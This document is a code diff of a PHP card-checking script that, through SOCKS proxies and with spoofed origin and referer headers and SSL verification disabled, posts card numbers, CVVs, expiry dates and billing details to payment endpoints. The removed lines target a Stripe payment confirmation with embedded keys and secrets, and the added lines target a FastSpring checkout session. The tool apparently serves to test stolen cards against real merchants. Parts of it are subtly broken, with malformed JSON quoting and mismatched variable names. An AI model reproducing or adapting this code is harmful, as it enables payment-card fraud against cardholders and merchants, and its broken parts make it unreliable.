@@ -71,15 +71,15 @@ $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
 //////////======= Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_1HtsqbBexl62HNHPqcVRjZdK/confirm');
+curl_setopt($ch, CURLOPT_URL, 'https://digismm.onfastspring.com/popup-digismm/session/WJzy4E3USze4EVcqhI_0ZA/payment');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: application/json',
+'accept: application/json, text/plain, */*',
 'accept-encoding: gzip, deflate, br', 
-'content-type: application/x-www-form-urlencoded',
-'origin: https://js.stripe.com',
-'referer: https://js.stripe.com/',
+'content-type: application/json;charset=UTF-8',
+'origin: https://digismm.onfastspring.com',
+'referer: https://digismm.onfastspring.com/popup-digismm/session/WJzy4E3USze4EVcqhI_0ZA',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
@@ -89,7 +89,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'save_payment_method=true&setup_future_usage=off_session&receipt_email='.$email.'&payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][city]='.$city.'&payment_method_data[billing_details][address][state]='.$state.'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]='.$postcode.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=21bc7cc7-e001-41dc-a16d-10cfd78b4137ebeb22&payment_method_data[muid]=d179d0fd-ca40-4c76-93b5-9299f6482da632e447&payment_method_data[sid]=9eeb42a3-3124-4689-9df3-7ce1d0689bb85fc202&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Faef56bce%3B+stripe-js-v3%2Faef56bce&payment_method_data[time_on_page]=50822&payment_method_data[referrer]=https%3A%2F%2Flendinghopeltd.co.uk%2F&expected_payment_method_type=card&use_stripe_sdk=true&spc_eligible=false&key=pk_live_73ukSuxmkxoltr4dupfmtPla&client_secret=pi_1HtsqbBexl62HNHPqcVRjZdK_secret_6Cp2zVubEoCBG3OZ0Lqmx0Av4');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"contact":{"email":"''.$email.","country":"GB","firstName":"'.$firstName.'","lastName":"'.$lastName.'","phoneNumber":"'.$number.'"},"card":{"year":"'.$ano.'","month":"'.$mes.'","number":"'.$cc.'","security":"'.$cvv.'"},"paymentType":"card","subscribe":false,"recipientSelected":false}  ');
 
  $result = curl_exec($ch);
  $token = trim(strip_tags(getStr($result1,'"id": "','"')));
